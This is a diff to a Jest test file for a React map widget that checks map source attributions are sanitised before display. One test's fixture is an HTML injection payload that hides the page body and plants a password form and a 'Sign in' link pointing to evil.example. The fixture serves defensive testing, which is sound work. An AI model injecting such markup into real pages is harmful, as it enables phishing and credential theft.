@@ -19,6 +19,8 @@ jest.unstable_mockModule("maplibre-gl", () => {
     handlers: { event: string; once: boolean; fn: Handler }[] = [];
     setStyle = jest.fn();
     addLayer = jest.fn();
+    // The style's sources as `getStyle`/`getSource` report them (#928).
+    styleSources: Record<string, { attribution?: string }> = {};
     constructor(options: Record<string, unknown>) {
       this.options = options;
       instances.push(this);
@@ -48,6 +50,12 @@ jest.unstable_mockModule("maplibre-gl", () => {
       return this;
     }
     addSource() {}
+    getStyle() {
+      return { sources: this.styleSources };
+    }
+    getSource(id: string) {
+      return this.styleSources[id];
+    }
     fitBounds() {}
     jumpTo() {}
     getCanvas() {
@@ -93,6 +101,7 @@ const maplibreMock = (await import("maplibre-gl")) as unknown as {
     options: Record<string, unknown>;
     setStyle: jest.Mock;
     addLayer: jest.Mock;
+    styleSources: Record<string, { attribution?: string }>;
     emit: (event: string, payload?: unknown) => void;
   }[];
 };
@@ -715,5 +724,67 @@ describe("MapWidgetUI — install basemap + fallback (#910)", () => {
     act(() => lastMap().emit("error", { error: new Error("blocked") }));
     expect(lastMap().setStyle).toHaveBeenCalledTimes(1);
     expect(notice()).toBeInTheDocument();
+  });
+});
+
+describe("MapWidgetUI — safe attribution (#928)", () => {
+  const rows = [{ lat: 1, lng: 2 }];
+  const lastMap = () =>
+    maplibreMock.__instances[maplibreMock.__instances.length - 1];
+
+  beforeEach(() => {
+    maplibreMock.__instances.length = 0;
+  });
+
+  it("turns off MapLibre's HTML attribution control", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    expect(lastMap().options.attributionControl).toBe(false);
+  });
+
+  it("renders a hostile source attribution as text only", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    act(() => {
+      lastMap().styleSources = {
+        hostile: {
+          attribution:
+            'HOSTILE<style>body{display:none}</style><form action="https://evil.example"><input type="password"></form><a href="https://evil.example">Sign in</a>',
+        },
+      };
+      lastMap().emit("sourcedata");
+    });
+    const box = screen.getByTestId("map-attribution");
+    expect(box).toHaveTextContent("HOSTILESign in");
+    const widget = screen.getByTestId("map-widget");
+    expect(widget.querySelector("style, form, input, img")).toBeNull();
+    expect(widget.querySelector('a[href*="evil"]')).toBeNull();
+  });
+
+  it("keeps CARTO's credits as links", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    act(() => {
+      lastMap().styleSources = {
+        carto: {
+          attribution:
+            '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors © <a href="https://carto.com/about-carto/">CARTO</a>',
+        },
+      };
+      lastMap().emit("styledata");
+    });
+    expect(screen.getByRole("link", { name: "CARTO" })).toHaveAttribute(
+      "href",
+      "https://carto.com/about-carto/"
+    );
+    expect(screen.getByTestId("map-attribution")).toHaveTextContent(
+      "© OpenStreetMap contributors © CARTO"
+    );
+  });
+
+  it("shows no attribution when no source credits anyone", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    act(() => {
+      lastMap().styleSources = { "layer-0": {} };
+      lastMap().emit("sourcedata");
+    });
+    expect(screen.queryByTestId("map-attribution")).toBeNull();
   });
 });
